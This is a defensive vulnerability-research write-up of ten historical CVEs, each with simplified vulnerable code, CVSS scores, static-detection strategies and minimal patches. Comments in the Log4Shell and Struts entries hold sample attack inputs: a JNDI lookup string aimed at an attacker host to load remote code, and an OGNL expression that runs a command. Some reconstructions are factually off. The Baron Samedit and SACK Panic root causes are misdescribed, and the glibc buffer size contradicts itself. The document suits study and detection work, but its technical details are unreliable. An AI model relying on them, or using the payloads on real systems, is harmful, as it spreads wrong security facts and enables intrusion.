# CVE Forensic Analysis — P6 Vulnerability Research

> Ten real historical CVEs dissected to extraction depth: root cause, vulnerable
> code pattern, CVSS scoring, static-analysis detection strategy, minimal patch,
> and a frank assessment of why each class is hard to detect statically.

---

## CVE-2021-3156 — sudo "Baron Samedit" (Heap Overflow)

**Vulnerability class:** Heap-based buffer overflow (off-by-one / unbounded argv rewrite)  
**Affected component:** sudo ≤ 1.9.5p1, `src/argv.c` `set_cmnd()`  
**CVSS v3.1 score:** 7.8 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  
**CWE:** CWE-122 (Heap-Based Buffer Overflow), CWE-193 (Off-by-One)

### Root Cause
When `sudoedit` rewrites `argv`, it calls `set_cmnd()` which allocates a buffer sized
`cmnd_size = arg_len + strlen(user_args) + 1` but then copies into it via a loop that
appends an extra backslash-escape for each backslash in the argument, allowing
unbounded heap writes beyond the allocation.

### Vulnerable Code Pattern
```c
// sudo src/argv.c  set_cmnd() — simplified
size_t cmnd_size = 0;
for (size_t i = 0; argv[i] != NULL; i++)
    cmnd_size += strlen(argv[i]) + 1;        // count space + separator

char *cmnd_buf = malloc(cmnd_size);          // allocation: sum of input lengths

char *dst = cmnd_buf;
for (size_t i = 0; argv[i] != NULL; i++) {
    const char *src = argv[i];
    while (*src) {
        if (*src == '\\')
            *dst++ = '\\';                   // EXTRA byte written — not counted in cmnd_size
        *dst++ = *src++;
    }
    *dst++ = ' ';
}
// dst may now be >> cmnd_buf + cmnd_size  →  heap overflow
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `argv[i]` — attacker-controlled network/local input via `sudoedit -s` invocation |
| **Propagation** | `strlen(argv[i])` feeds `cmnd_size` — taint flows through additive size computation |
| **Sink** | `*dst++ = '\\'` write inside loop — the extra branch write is NOT reflected in the allocation size |
| **Technique** | Allocation-size vs. write-size divergence analysis; the analyzer must track that the loop can emit *more* bytes than were summed in the sizing loop. A symbolic loop-invariant checker (e.g., CodeChecker/clangsa with loop widening) can flag: `emit_bytes_upper_bound(loop2) > alloc_size`. |

### Minimal Patch
```c
// Count escape expansions in the sizing loop too:
for (size_t i = 0; argv[i] != NULL; i++) {
    for (const char *p = argv[i]; *p; p++) {
        cmnd_size++;
        if (*p == '\\') cmnd_size++;         // account for the extra backslash copy
    }
    cmnd_size++;                              // separator
}
```

### Why This Class Is Hard to Detect Statically
The size computation and the write loop are structurally identical `for` loops over the same
`argv`, but the write loop has a conditional branch (`if (*src == '\\')`) that expands the
output.  An analyzer must prove that the **worst-case emit count** of loop 2 exceeds the
**sizing loop's sum** — requiring loop-invariant reasoning over a character-level predicate.
Most tools model loops conservatively (unknown iterations) producing high false-positive rates,
or they under-approximate loop bodies, missing the conditional expansion entirely.

---

## CVE-2014-0160 — Heartbleed (Buffer Over-Read)

**Vulnerability class:** Heap buffer over-read  
**Affected component:** OpenSSL ≤ 1.0.1f, `ssl/d1_both.c`, `t1_lib.c`  
**CVSS v3.1 score:** 7.5 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
**CWE:** CWE-125 (Out-of-Bounds Read), CWE-20 (Improper Input Validation)

### Root Cause
The TLS heartbeat handler copies `payload_length` bytes from the heartbeat request into the
response without verifying that `payload_length` is ≤ the actual length of received data,
allowing reads of up to 64 KB of heap memory beyond the request buffer.

### Vulnerable Code Pattern
```c
// ssl/t1_lib.c  tls1_process_heartbeat() — simplified
unsigned int payload;
const unsigned char *p = s->s3->rrec.data;   // incoming TLS record

// Read attacker-supplied payload length from wire (2 bytes, big-endian)
n2s(p, payload);                             // payload = attacker value, up to 0xFFFF

// Allocate response: type(1) + length(2) + payload + padding(16)
unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload + 16);
unsigned char *bp = buffer;

// Copy payload bytes from request back into response
memcpy(bp, pl, payload);                     // pl points into request buffer
                                             // NO CHECK: payload <= actual_record_length
// If payload > real data, memcpy reads beyond the record into adjacent heap memory
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `s->s3->rrec.data` — network-derived buffer; `payload` parsed from first 2 bytes |
| **Propagation** | `payload` is tainted; it flows directly into both `OPENSSL_malloc` and `memcpy` length |
| **Sink** | `memcpy(bp, pl, payload)` — tainted length, unchecked against record's actual length |
| **Technique** | Taint analysis + "length vs. buffer-bound" constraint: taint-tracked `payload` reaches `memcpy` as the `n` argument; the analyzer checks whether a bound assertion `payload <= actual_record_len` exists on every dominating path. Missing bound → CWE-125 finding. |

### Minimal Patch
```c
// Add one bounds check before memcpy:
if (1 + 2 + payload + 16 > s->s3->rrec.length)   // request too short
    return 0;                                       // silently drop malformed heartbeat
memcpy(bp, pl, payload);
```

### Why This Class Is Hard to Detect Statically
The `payload` value is used in **two** separate operations: `malloc(... + payload ...)` (which
looks like a safe size-parameterized allocation) and `memcpy(..., payload)` (the actual read).
Most static analyses see the `malloc` and infer the buffer is large enough for `payload` bytes
— they do not ask whether the *source* buffer `pl` is also large enough.  Distinguishing
"destination is large enough" from "source is large enough" in a `memcpy(dst, src, n)` call
requires modeling both bounds simultaneously, which most checkers skip to avoid false positives.

---

## CVE-2022-0185 — Linux Kernel `legacy_parse_param` (Integer Overflow)

**Vulnerability class:** Integer overflow → heap buffer overflow  
**Affected component:** Linux kernel ≤ 5.16.2, `fs/fs_context.c` `legacy_parse_param()`  
**CVSS v3.1 score:** 8.4 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
**CWE:** CWE-190 (Integer Overflow), CWE-122 (Heap-Based Buffer Overflow)

### Root Cause
`legacy_parse_param()` accumulates mount option string lengths using an `unsigned int` counter
`size`; an attacker supplying many options can wrap `size` to a small value, causing
`krealloc()` to allocate a buffer far smaller than the data subsequently written into it.

### Vulnerable Code Pattern
```c
// fs/fs_context.c  legacy_parse_param() — simplified
struct legacy_fs_context *ctx = fc->fs_private;
unsigned int size = ctx->data_size;            // 32-bit accumulator

// param->key and param->string come from user-controlled mount options
size += strlen(param->key) + 1;               // += may wrap if many options supplied
if (param->type == fs_value_is_string)
    size += strlen(param->string) + 1;

// If size wrapped (e.g., 0xFFFFFFFF + 2 == 1), krealloc gets tiny size
if (ctx->data) {
    char *p = krealloc(ctx->data, size, GFP_KERNEL);  // allocates ~1 byte
    ctx->data = p;
    ctx->data_size = size;
}
// Subsequent strcat/copy writes full untruncated option → heap overflow
strcat(ctx->data, param->key);
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `param->key`, `param->string` — user-space mount(2) syscall arguments |
| **Propagation** | `strlen(param->key)` is tainted; added to `size` with no overflow guard |
| **Sink** | `krealloc(ctx->data, size, ...)` — tainted, potentially wrapped `size` |
| **Technique** | Integer-overflow taint: track `size += strlen(...)` where `strlen` is taint-source; flag any `malloc`/`krealloc` call whose size argument is the result of repeated unchecked addition of tainted values. Range analysis over loop bounds can prove `size` can exceed `UINT_MAX`. |

### Minimal Patch
```c
// Change accumulator to size_t (or add overflow guard):
if (size + len + 1 < size)                    // overflow check
    return -ENAMETOOLONG;
size += len + 1;
// Or: use size_t for the counter (64-bit on LP64 kernels, no practical wrap)
```

### Why This Class Is Hard to Detect Statically
The overflow happens across **multiple calls** to the same function (each mount option is one
call); no single call site shows the wrap.  An interprocedural analysis must model the
cumulative effect of repeated additions across a loop or repeated invocations, and must know
the type of `size` is `unsigned int` (not `size_t`).  Without loop-carried taint state, most
tools report each individual `+=` as safe (each individual `strlen` result is bounded).

---

## CVE-2016-5195 — Dirty COW (Race Condition / TOCTOU)

**Vulnerability class:** Race condition (TOCTOU) in copy-on-write page handling  
**Affected component:** Linux kernel ≤ 4.8.2, `mm/memory.c` `do_cow_fault()`  
**CVSS v3.1 score:** 7.0 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`  
**CWE:** CWE-362 (Race Condition / Concurrent Execution), CWE-119 (Buffer Mismanagement)

### Root Cause
The kernel's `write_protect_page()` / `do_wp_page()` COW path races with `madvise(MADV_DONTNEED)`
in a second thread; between the permission check that confirms the page is read-only and the
actual private copy being installed, the page can be dropped and the write directed to the
original underlying file page, bypassing the copy-on-write mechanism entirely.

### Vulnerable Code Pattern
```c
// mm/memory.c — abstract race window (simplified)

// Thread 1: write() via /proc/self/mem
faulting_address = READONLY_MAPPING;         // e.g., /etc/passwd mmap
// Kernel enters do_cow_fault():
//   1. checks page is read-only  ✓
//   2. allocates new private page
//   3. copies content to private page
//   *** RACE WINDOW: Thread 2 calls madvise(MADV_DONTNEED) here ***
//   4. does NOT install private page (DONTNEED dropped it)
//   5. retries — now get_user_pages(..., FOLL_WRITE) returns ORIGINAL page
//   6. writes attacker data to ORIGINAL READ-ONLY page

// Thread 2: madvise loop
while (race_not_won)
    madvise(map, MAP_SIZE, MADV_DONTNEED);   // repeatedly drops private copy
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `get_user_pages()` return value — the physical page handed to the write path |
| **Propagation** | The page reference crosses a point where a concurrent `madvise` can invalidate the COW invariant |
| **Sink** | `copy_to_user()` / direct page write using the page obtained before the race window |
| **Technique** | This class is fundamentally beyond most static analyzers. Concurrency race detectors (e.g., ThreadSanitizer at runtime, or static data-race tools like RacerD) can flag unsynchronized shared-state access, but the kernel's lock-free retry (`FOLL_WRITE` → retry loop) is the intentional design; the bug is a logic error in the retry condition, not a missing lock. |

### Minimal Patch
```c
// Commit 19be0eaffa3ac7 — add FOLL_COW flag to distinguish first vs retry:
if (flags & FOLL_WRITE) {
    if (!pte_write(pte)) {
        if (flags & FOLL_COW)
            // Already did COW, something went wrong — don't retry blindly
            return -EFAULT;
        // First attempt: do COW
        flags |= FOLL_COW;
        goto retry;
    }
}
```

### Why This Class Is Hard to Detect Statically
Race conditions require reasoning about **two concurrent execution paths** and the
interleaving points between them.  Static analyzers typically analyze a single thread at a
time; even tools that model concurrency must enumerate thread interleavings, which is
exponential in the number of shared-state accesses.  Additionally, the Dirty COW race
exploits a **logically correct but incomplete retry loop** — the code is not wrong for
any single-threaded execution, only for a specific adversarial interleaving involving a
syscall that the kernel itself provides to the attacker.

---

## CVE-2020-8616 — BIND 9 DNS Resolver (Use-After-Free)

**Vulnerability class:** Use-after-free  
**Affected component:** BIND 9 ≤ 9.16.3, `lib/dns/resolver.c`  
**CVSS v3.1 score:** 8.6 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H`  
**CWE:** CWE-416 (Use After Free)

### Root Cause
During NXDOMAIN redirect processing, `dns_resolver_detach()` decrements the resolver's
reference count to zero and frees the object, but a stale `fctx` (fetch context) pointer
held in a task callback still references that freed resolver object, causing a use-after-free
when the callback fires.

### Vulnerable Code Pattern
```c
// lib/dns/resolver.c — simplified fetch context callback
typedef struct fctx {
    dns_resolver_t *res;     // raw pointer — no refcount held!
    ...
} fctx_t;

void fctx_done(fctx_t *fctx, isc_result_t result) {
    dns_resolver_t *res = fctx->res;   // stale pointer if resolver was detached

    // Some paths call dns_resolver_detach() earlier on this same res...
    // Reference count hits 0, object is freed

    isc_task_send(res->task, &event);  // USE-AFTER-FREE: res may be freed
    // res->task dereference on heap memory returned to allocator
}
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `dns_resolver_detach()` — the free path (via refcount hitting zero) |
| **Propagation** | `fctx->res` is not nulled or removed from the callback after detach |
| **Sink** | `res->task` dereference in `isc_task_send()` |
| **Technique** | Lifetime / ownership analysis: track that `fctx->res` is a non-owning (raw) pointer; flag any code path where `dns_resolver_detach(fctx->res)` is reachable before the callback completion. Tools like Clang's `alpha.cplusplus.STLAlgorithmModeling` or custom ownership checkers (similar to Facebook Infer's biabduction) can model refcount semantics if annotated. |

### Minimal Patch
```c
// Hold an extra reference for the duration of fctx's lifetime:
dns_resolver_attach(res, &fctx->res);        // increments refcount
// ... in fctx_destroy():
dns_resolver_detach(&fctx->res);             // decrements; freed only when zero
```

### Why This Class Is Hard to Detect Statically
UAF in refcounted C code requires the analyzer to track the **refcount value** (an integer
field, not a language-level concept) across all call sites that increment and decrement it,
and to prove that a code path exists where count reaches zero while another alias remains
live.  This is an interprocedural, flow-sensitive, value-tracking problem.  False positive
risk is high because most aliases are benign; distinguishing a "raw borrowed pointer" from
an "owning pointer" requires semantic annotations absent from C.

---

## CVE-2019-11477 — SACK Panic (TCP Integer Overflow)

**Vulnerability class:** Integer overflow → signed integer underflow → BUG_ON kernel panic  
**Affected component:** Linux kernel ≤ 5.1.11, `net/ipv4/tcp_input.c`  
**CVSS v3.1 score:** 7.5 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`  
**CWE:** CWE-190 (Integer Overflow), CWE-131 (Incorrect Calculation of Buffer Size)

### Root Cause
`tcp_sacktag_walk()` builds a linked list of SACK'd segments; with a crafted sequence of
SACK blocks, the `mss` value of 1 and 45+ SACK blocks force `tcp_skb_pcount()` to return
a value that when accumulated causes `tp->sacked_out` to underflow (wrap to a large
unsigned value), which `BUG_ON(tp->sacked_out < ...)` catches as a kernel panic.

### Vulnerable Code Pattern
```c
// net/ipv4/tcp_input.c — tcp_sacktag_one() — simplified
static int tcp_sacktag_one(...) {
    // pcount = number of MSS-sized packets in this skb
    int pcount = tcp_skb_pcount(skb);        // can be very large if mss=1

    // sacked_out tracks how many segments are SACKed
    // With 45 SACK blocks each adding pcount, the 32-bit counter wraps
    tp->sacked_out += pcount;                // NO overflow guard

    // Later assertion checks internal consistency:
    if (tp->sacked_out < tp->lost_out)       // now wraps negative → always true wrong
        BUG();                               // kernel panic — denial of service
}
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | SACK option bytes in incoming TCP segment — `skb` data, `mss` value |
| **Propagation** | `tcp_skb_pcount(skb)` → `pcount`; `pcount` accumulated into `tp->sacked_out` |
| **Sink** | `BUG_ON` / `BUG()` reachable when `sacked_out` wraps; or the wrapped value used in allocation |
| **Technique** | Unsigned integer overflow detection: mark `tcp_skb_pcount()` return as network-tainted; flag `+=` accumulation into a 32-bit field without a bound check; range analysis shows `sacked_out` can reach `UINT_MAX` given attacker-controlled `mss=1` and 45 SACK blocks per ACK. |

### Minimal Patch
```c
// net/ipv4/tcp_input.c — limit SACK blocks and add overflow guard
#define TCP_SACK_BLOCKS_MAX  4              // was unbounded; limit per RFC

// Or add explicit saturation:
if (tp->sacked_out + pcount < tp->sacked_out)   // overflow check
    tp->sacked_out = tp->packets_out;
else
    tp->sacked_out += pcount;
```

### Why This Class Is Hard to Detect Statically
The overflow accumulates across **multiple packets** (not a single function call); a static
analyzer processing a single invocation of `tcp_sacktag_one` sees a bounded addition.  Only
with loop/call-count reasoning ("this function is called N times per ACK, N is network-controlled")
can the tool deduce wrap.  Additionally, the sink is an assertion (`BUG_ON`), not a memory
write — most tools only track memory safety sinks, not assertion reachability.

---

## CVE-2021-44228 — Log4Shell (JNDI Injection)

**Vulnerability class:** Remote code execution via JNDI injection (untrusted deserialization /
server-side request forgery chained with class loading)  
**Affected component:** Apache Log4j 2 ≤ 2.14.1, `PatternLayout` message lookup  
**CVSS v3.1 score:** 10.0 (Critical)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
**CWE:** CWE-917 (Improper Neutralization of Special Elements), CWE-502 (Deserialization of Untrusted Data)

### Root Cause
Log4j's `MessagePatternConverter` evaluates `${...}` lookup expressions embedded in log
message strings; the `jndi:` lookup protocol handler performs an outbound LDAP/RMI lookup
to an attacker-controlled server and loads and instantiates the returned Java class, executing
arbitrary code in the JVM process.

### Vulnerable Code Pattern
```java
// org.apache.logging.log4j.core.pattern.MessagePatternConverter — simplified

public void format(LogEvent event, StringBuilder toAppendTo) {
    String msg = event.getMessage().getFormattedMessage();
    // msg may contain ${jndi:ldap://attacker.com/x}  from HTTP header User-Agent etc.

    if (config != null) {
        // StrSubstitutor recursively resolves ${...} expressions in msg
        msg = config.getStrSubstitutor().replace(event, msg);  // DANGEROUS EVALUATION
    }
    toAppendTo.append(msg);
}

// JndiLookup.lookup():
public String lookup(LogEvent event, String key) {
    // key = "ldap://attacker.com/Exploit"
    Object value = this.context.lookup(key);    // JNDI lookup — outbound network call
    // JVM fetches attacker's LDAP response, which references a remote class
    // Class is loaded and instantiated → static initializer runs → RCE
    return value.toString();
}
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `event.getMessage().getFormattedMessage()` — any logged string (HTTP headers, user input) |
| **Propagation** | Tainted string flows into `StrSubstitutor.replace()` → `JndiLookup.lookup()` |
| **Sink** | `InitialContext.lookup(tainted_string)` — JNDI lookup with attacker-controlled URL |
| **Technique** | Java taint analysis (e.g., CodeQL `java/log-injection` + custom JNDI-sink query): track `getMessage()` → through string concatenation / substitution → to `Context.lookup()`. The key is identifying `Context.lookup()` as a dangerous sink for tainted strings. SpotBugs FIND_BUGS rules or custom Semgrep rules can flag `jndi.*\.lookup\(.*\)` reachable from logging paths. |

### Minimal Patch
```java
// Log4j 2.15.0 patch: disable message lookups by default
// log4j2.formatMsgNoLookups=true  (system property)

// Code-level: in MessagePatternConverter, skip substitution for message text:
// Replace:
msg = config.getStrSubstitutor().replace(event, msg);
// With:
// (no substitution applied to the raw message body — only to the pattern format string)
```

### Why This Class Is Hard to Detect Statically
The injection path passes through a **generic string template engine** (`StrSubstitutor`) that
is also used for legitimate configuration substitutions.  A static analyzer must distinguish
"this substitution input is user-controlled log data" from "this substitution input is the
log format pattern."  The taint path traverses multiple layers of abstraction (logging API →
pattern converter → lookup resolver → JNDI context), and the dangerous sink (`Context.lookup`)
is not traditionally classified as a security sink — it is a normal Java API.  False positives
arise wherever `Context.lookup` is called with static strings (normal JNDI usage).

---

## CVE-2015-7547 — glibc `getaddrinfo` (Stack Buffer Overflow)

**Vulnerability class:** Stack-based buffer overflow  
**Affected component:** glibc ≤ 2.23, `nss/getXXbyYY_r.c`, `sysdeps/posix/getaddrinfo.c`  
**CVSS v3.1 score:** 8.1 (High)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**CWE:** CWE-121 (Stack-Based Buffer Overflow)

### Root Cause
The `send_dg()` function in glibc's DNS stub resolver uses a 2048-byte stack buffer for DNS
responses; when a response exceeds 2048 bytes (valid for DNSSEC or large TXT records), the
code retries using a heap buffer, but a crafted second response can overflow the stack buffer
of the *calling* `getaddrinfo` frame due to an incorrect size check.

### Vulnerable Code Pattern
```c
// sysdeps/posix/getaddrinfo.c / resolv/res_send.c — simplified
#define MAXPACKET  1024    // glibc internal, too small for DNSSEC

static int send_dg(res_state statp, ...) {
    uint8_t ans[MAXPACKET];       // 1024-byte STACK buffer
    int anslen = sizeof(ans);

    // First DNS response: server returns 2048-byte DNSSEC reply
    // Retry flag set, but ans buffer is still stack-allocated

    int n = recvfrom(s, ans, anslen, 0, ...);  // n can be > 1024 if EDNS0 response
    // No check: n <= anslen before proceeding
    // Process ans[0..n-1] — reads beyond stack buffer
    // Copies into caller's stack frame → stack overflow
}
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `recvfrom()` return value `n` — network-controlled response length |
| **Propagation** | `n` compared to `anslen` only in some code paths; the retry path bypasses the check |
| **Sink** | Array access `ans[i]` for `i` in range `[0, n)` where `n > MAXPACKET` |
| **Technique** | Buffer-bound analysis: `ans` declared as `uint8_t ans[MAXPACKET]`; `recvfrom` writes up to the OS buffer; flag any post-`recvfrom` access using `n` as index/length against a fixed-size stack array without `min(n, MAXPACKET)` guard. Taint `n = recvfrom(...)`, trace to array indexing. |

### Minimal Patch
```c
// Bound the receive length to buffer size:
int n = recvfrom(s, ans, sizeof(ans) - 1, 0, ...);
if (n < 0) return -1;
if (n >= (int)sizeof(ans)) {
    // Response truncated; retry with heap allocation
    goto use_heap_buffer;
}
```

### Why This Class Is Hard to Detect Statically
The dangerous path only activates on the **retry code path** after a response is flagged as
truncated — the first call is safe because the check works correctly.  Static analyzers must
model control flow through the retry state machine and reason that the stack buffer remains
in use (rather than being replaced) during the retry.  Alias analysis must track that `ans`
still points to the stack array, not a heap buffer, in the retry branch.

---

## CVE-2018-11776 — Apache Struts (OGNL Injection)

**Vulnerability class:** Server-side expression language injection (OGNL)  
**Affected component:** Apache Struts 2 ≤ 2.5.16, `DefaultActionMapper`  
**CVSS v3.1 score:** 9.8 (Critical)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**CWE:** CWE-917 (Improper Neutralization of Special Elements in an Expression Language)

### Root Cause
`DefaultActionMapper.handleSpecialParameters()` evaluates OGNL expressions extracted from
URL namespace segments when `alwaysSelectFullNamespace` is `true` and no `<result>` tag defines
the namespace; the namespace is used as an OGNL expression without sanitization, allowing
arbitrary Java code execution.

### Vulnerable Code Pattern
```java
// org.apache.struts2.dispatcher.mapper.DefaultActionMapper — simplified

public ActionMapping getMappingFromRequest(HttpServletRequest request) {
    String uri = getUri(request);
    // uri = "/${@java.lang.Runtime@getRuntime().exec('calc')}/index.action"

    String namespace = extractNamespace(uri);  // returns raw OGNL expression from URL

    if (namespace != null && namespace.contains("${")) {
        // VULNERABLE: evaluate namespace as OGNL without whitelist/sanitization
        namespace = TextParseUtil.translateVariables(namespace, stack);
        // translateVariables() calls OgnlUtil.getValue() on the expression → RCE
    }
    mapping.setNamespace(namespace);
    return mapping;
}
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `request.getRequestURI()` / `getUri(request)` — HTTP request URL |
| **Propagation** | `extractNamespace(uri)` → `namespace`; taint preserved through string manipulation |
| **Sink** | `TextParseUtil.translateVariables(namespace, stack)` → `OgnlUtil.getValue()` — OGNL evaluation |
| **Technique** | Java taint analysis: mark `HttpServletRequest` methods as taint sources; mark `OgnlUtil.getValue()`, `TextParseUtil.translateVariables()` as dangerous sinks for tainted strings. Semgrep rule: `translateVariables($TAINTED, ...)` reachable from request-derived data. |

### Minimal Patch
```java
// Struts 2.5.17 fix: validate namespace against allowed pattern before evaluation
private static final Pattern ALLOWED_NAMESPACE =
    Pattern.compile("[a-zA-Z0-9._\\-/]*");   // no special OGNL chars

if (namespace != null) {
    if (!ALLOWED_NAMESPACE.matcher(namespace).matches())
        throw new IllegalArgumentException("Invalid namespace: " + namespace);
    // Only evaluate if the namespace came from the config, not the URL
}
```

### Why This Class Is Hard to Detect Statically
The dangerous sink (`OgnlUtil.getValue`) is a **legitimate internal API** used extensively
throughout Struts for config-driven expression evaluation; the same method is safe when
called with configuration-sourced expressions and dangerous only when called with
request-derived data.  Static taint must flow through several indirection layers
(`getMappingFromRequest` → `extractNamespace` → `translateVariables` → OGNL eval), and
the "namespace came from config vs. URL" distinction is a semantic runtime property, not
a type-level property — high false positive risk on all legitimate OGNL evaluation paths.

---

## CVE-2017-0144 — EternalBlue / WannaCry (SMBv1 Buffer Overflow)

**Vulnerability class:** Heap buffer overflow (type confusion + improper buffer extension)  
**Affected component:** Windows SMBv1 (`srv.sys`), `SrvOs2FeaToNt()` / transaction processing  
**CVSS v3.1 score:** 9.8 (Critical)  
**CVSS v3.1 vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`  
**CWE:** CWE-119 (Improper Restriction of Operations within Buffer Bounds), CWE-843 (Type Confusion)

### Root Cause
The SMBv1 server converts OS/2 Feature Attribute (FEA) lists to NT format in a heap
buffer sized for the OS/2 list, but `SrvOs2FeaToNt()` uses the wrong field (`NextEntryOffset`
from the NT structure) to compute how much space the NT conversion requires, producing a
size far smaller than the actual NT FEA data written, causing a heap buffer overflow.

### Vulnerable Code Pattern
```c
// srv.sys SrvOs2FeaToNt() — reconstructed from reverse engineering
NTSTATUS SrvOs2FeaListToNt(PFEALIST Os2List, PFILE_FULL_EA_INFORMATION *NtList) {
    // Compute required NT buffer size:
    ULONG ntSize = SrvOs2FeaListSizeToNt(Os2List);  // BUG: uses NT struct field
                                                      // to measure OS2 input → wrong!

    *NtList = ExAllocatePool(PagedPool, ntSize);     // allocates ~ntSize bytes

    // Convert: writes actual NT FEA structures which are LARGER than ntSize
    PFILE_FULL_EA_INFORMATION ntEntry = *NtList;
    PFEA os2Entry = &Os2List->list[0];

    while (os2Entry) {
        // NT entry is: NextEntryOffset(4) + Flags(1) + EaNameLength(1) +
        //              EaValueLength(2) + EaName(variable) + EaValue(variable)
        // Written size > computed ntSize  →  heap overflow
        RtlCopyMemory(ntEntry, /* converted data */, realNtEntrySize);
        ntEntry = (PFILE_FULL_EA_INFORMATION)((ULONG_PTR)ntEntry + realNtEntrySize);
    }
}
```

### Static Analysis Detection Strategy
| Phase | Detail |
|-------|--------|
| **Source** | `Os2List` — SMB packet data, network-attacker controlled |
| **Propagation** | `SrvOs2FeaListSizeToNt()` returns a size computed from the wrong struct layout; `ExAllocatePool` uses it |
| **Sink** | `RtlCopyMemory(ntEntry, ..., realNtEntrySize)` — writes beyond allocated buffer |
| **Technique** | Allocation-vs-write divergence: flag when `ExAllocatePool(size)` is followed by writes that accumulate more than `size` bytes into the same buffer. Requires tracking struct layout differences (OS/2 FEA vs NT FEA), which is a type-awareness challenge for most static tools. Binary analysis tools (Ghidra's PCode analysis, BinAbsInt) are needed since `srv.sys` is closed-source. |

### Minimal Patch
```c
// Fix SrvOs2FeaListSizeToNt to correctly compute NT size from OS/2 input fields:
// For each OS/2 FEA entry (cbName + cbValue):
ntSize += sizeof(FILE_FULL_EA_INFORMATION)   // fixed header
        + os2Entry->cbName + 1               // name + null
        + os2Entry->cbValue;                 // value
ntSize = ALIGN_UP(ntSize, ULONG);            // align to 4 bytes
```

### Why This Class Is Hard to Detect Statically
The bug is a **semantic mismatch between two struct layouts** — the size function uses the
wrong struct type's field definition to measure the input.  This requires the analyzer to
understand and cross-reference two distinct struct schemas and verify that the size
computed using schema A is sufficient to hold data written according to schema B.
Type-confusion bugs span the semantic gap between what C's type system allows and what the
program's data model intends.  No C compiler or standard static analyzer tracks
"this pointer was allocated to hold `FEALIST` data but is being written as `FILE_FULL_EA_INFORMATION`
data" because both are `void *` / `ULONG_PTR` in the kernel allocation APIs.

---

## Summary Table

| # | CVE | Class | CVSS | Patch Complexity |
|---|-----|-------|------|-----------------|
| 1 | CVE-2021-3156 | Heap overflow (off-by-one, loop expansion) | 7.8 | Low — fix sizing loop |
| 2 | CVE-2014-0160 | Heap over-read | 7.5 | Very low — one bounds check |
| 3 | CVE-2022-0185 | Integer overflow → heap overflow | 8.4 | Low — change type to `size_t` |
| 4 | CVE-2016-5195 | Race condition (TOCTOU) | 7.0 | Medium — add FOLL_COW flag |
| 5 | CVE-2020-8616 | Use-after-free | 8.6 | Low — attach/detach reference |
| 6 | CVE-2019-11477 | Integer overflow → kernel panic | 7.5 | Low — add saturation check |
| 7 | CVE-2021-44228 | JNDI injection | 10.0 | Low — disable message lookups |
| 8 | CVE-2015-7547 | Stack buffer overflow | 8.1 | Low — bound recv length |
| 9 | CVE-2018-11776 | OGNL injection | 9.8 | Low — whitelist namespace |
| 10 | CVE-2017-0144 | Type confusion + heap overflow | 9.8 | Medium — fix size computation |

---

## Cross-Cutting Detection Challenges

### Why Static Analysis Misses These Bugs

1. **Multi-call accumulation** (CVE-2022-0185, CVE-2019-11477): overflow happens across N
   invocations, not within one.

2. **Dual-buffer semantics** (CVE-2014-0160): `malloc(n)` looks safe; the bug is that the
   *source* buffer for `memcpy` is smaller than `n`.

3. **Race conditions** (CVE-2016-5195): single-threaded analysis cannot observe concurrent
   interleavings; the bug only exists at a specific thread scheduling point.

4. **Semantic type confusion** (CVE-2017-0144): two structs with incompatible layouts are
   treated as the same `void *` — no type-level evidence.

5. **Legitimate API as sink** (CVE-2021-44228, CVE-2018-11776): the dangerous function
   (`Context.lookup`, `OgnlUtil.getValue`) is heavily used for non-dangerous purposes
   throughout the same codebase — false positive rate is high.

6. **Loop expansion** (CVE-2021-3156): the write loop emits more bytes than the sizing loop
   computed; requires loop-invariant reasoning on two structurally identical loops.
